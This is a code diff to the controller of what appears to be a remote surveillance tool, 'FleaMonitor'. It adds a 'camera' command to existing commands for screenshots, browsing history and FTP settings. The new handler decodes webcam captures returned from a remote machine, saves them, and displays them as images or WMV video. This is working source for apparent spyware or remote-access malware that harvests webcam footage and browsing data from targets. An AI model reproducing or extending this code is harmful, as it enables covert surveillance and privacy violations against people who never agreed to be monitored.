@@ -4,6 +4,7 @@ using System;
 using System.IO;
 using System.Reflection;
 using System.Text;
+using System.Windows;
 using System.Windows.Media.Imaging;
 
 namespace FleaMonitor.Auxiliary
@@ -24,6 +25,7 @@ namespace FleaMonitor.Auxiliary
         public const string QUIT_COMMAND = "quit";
         public const string SET_FTP_COMMAND = "setftp";
         public const string BROWSING_HISTORY_COMMAND = "history";
+        public const string GET_CAMERA_CAPTURE_COMMAND = "camera";
 
         private static readonly string SCREENSHOT_FILENAME = "screenshot.png";
         private static readonly string BROWSING_HISTORY_FILENAME = "browsing_history.txt";
@@ -76,10 +78,25 @@ namespace FleaMonitor.Auxiliary
 
             var absolutePath = Path.Combine(WorkingPath, fileName);
             var imageWindow = new ImageWindow();
+            imageWindow.Owner = Application.Current.MainWindow;
             imageWindow.imageViewer.Source = new BitmapImage(new Uri(absolutePath));
             imageWindow.Show();
         }
         
+        private static void PlayWMVFile(string fileName)
+        {
+            if (WorkingPath is null)
+            {
+                throw new FileNotFoundException("Couldn't get assembly path!");
+            }
+
+            var absolutePath = Path.Combine(WorkingPath, fileName);
+            var playWindow = new PlayMovieWindow();
+            playWindow.Owner = Application.Current.MainWindow;
+            playWindow.mediaElement.Source = new Uri(absolutePath);
+            playWindow.Show();
+        }
+
         /// <summary>
         /// Process returned data
         /// </summary>
@@ -107,6 +124,19 @@ namespace FleaMonitor.Auxiliary
                     fleaInfo.Txt = $"File {value} saved.\n";
                     break;
 
+                case GET_CAMERA_CAPTURE_COMMAND:
+                    SaveByteArrayToFile(Convert.FromHexString(Encoding.UTF8.GetString(buffer)), value);
+                    fleaInfo.Txt = "Camera capture saved.\n";
+                    if(value.ToLower().IndexOf(".wmv") != -1)
+                    {
+                        PlayWMVFile(value);
+                    }
+                    else
+                    {
+                        ShowScreenshot(value);
+                    }
+                    break;
+                    
                 case BROWSING_HISTORY_COMMAND:
                     SaveByteArrayToFile(buffer, BROWSING_HISTORY_FILENAME);
                     fleaInfo.Txt = $"File {BROWSING_HISTORY_FILENAME} saved.\n";
